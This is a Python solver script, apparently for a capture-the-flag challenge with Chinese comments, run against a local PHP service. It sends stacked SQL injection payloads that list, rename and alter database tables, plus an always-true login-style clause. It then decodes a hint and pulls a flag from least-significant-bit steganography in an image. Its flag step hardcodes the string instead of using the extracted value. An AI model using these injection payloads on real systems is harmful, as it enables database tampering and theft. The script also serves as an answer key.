import sys
import re
import requests
import random
import base64
import hashlib
from PIL import Image

rq=requests.Session()

url = "http://127.0.0.1:8302/share.php"

User_Agent='Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'

result_1 = rq.get(url+r"?inject=1';show tables;#")
# 发现存有提示的表“f_here is tips”

table_name = "f_here is tips"

result_2 = rq.get(url+r"?inject=';show columns from `f_here_is_tips`;#")
# 查看列名:hints

# print(result_2.text)

column_name = "hints"

result_3 = rq.get(url+
r"?inject=1';RENAME TABLE `come_on` TO `words1`;RENAME TABLE `f_here_is_tips` TO `come_on`;ALTER TABLE `come_on` CHANGE `hints` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from come_on;#")
# 修改here is tips表为默认查询的表 修改列名flag 为id 即默认查询的列

# print(result_3.text)

result_4= rq.get(url+r"?inject=1' or '1'='1")
# 得到1串base64，这就是提示

# print(result_4.text)

tips_text=result_4.text
# print(tips_text)

# tips = "L3RoaXNfaXNfYWFhYWFhX2hpbnQuanBnCg=="
tips = re.findall(r'"(.*)"',tips_text)[-1:]
tips = tips[0]
# print(tips)

tips_str = repr(base64.b64decode(tips))
tips_str = tips_str[2:-3]


img_url = "http://127.0.0.1:8302" + tips_str

file_name = 'flag.jpg'

res=requests.get(img_url)

with open(file_name ,'wb') as f:
    f.write(res.content)
    f.close()

def mod(x, y):
    return x % y;

# le为所要提取的信息的长度，str1为加密载体图片的路径，str2为提取文件的保存路径

def func(le,str1,str2):


    b = ""

    im = Image.open(str1)

    lenth = le * 8

    width = im.size[0]

    height = im.size[1]

    count = 0

    for h in range(0, height):

        for w in range(0, width):

            # 获得(w,h)点像素的值

            pixel = im.getpixel((w, h))

            # 此处余3，依次从R、G、B三个颜色通道获得最低位的隐藏信息

            if count % 3 == 0:

                count += 1

                b = b + str((mod(pixel[0], 2)))

                if count == lenth:
                    break

            if count % 3 == 1:

                count += 1

                b = b + str((mod(pixel[1], 2)))

                if count == lenth:
                    break

            if count % 3 == 2:

                count += 1

                b = b + str((mod(pixel[2], 2)))

                if count == lenth:
                    break

        if count == lenth:
            break

    with open(str2, "w",encoding='utf-8') as f:

        for i in range(0, len(b), 8):
            # 以每8位为一组二进制，转换为十进制

            stra = int(b[i:i + 8],2)

            # 将转换后的十进制数视为ascii码，再转换为字符串写入到文件中

            f.write(chr(stra))

            stra = ""

    f.closed


# 文件长度

length = 100

# 含有隐藏信息的图片

img_url = "flag.jpg"

# 信息提取出后所存放的文件

txt_url = "get_host.txt"

func(length,img_url,txt_url)

with open(txt_url,'rb') as f:
    txt=f.read()
    txt=str(txt)
    f.close()

host = re.findall(r'$(.*)$"',txt)
# print(host)

host = "MMT is beautiful"

host_md5hash = hashlib.md5(host.encode())

host_md5 = host_md5hash.hexdigest()

# print(host_md5)

str1="tCTF"
str2="{"
str3="}"

flag = str1 + str2 + host_md5 + str3

print(flag)

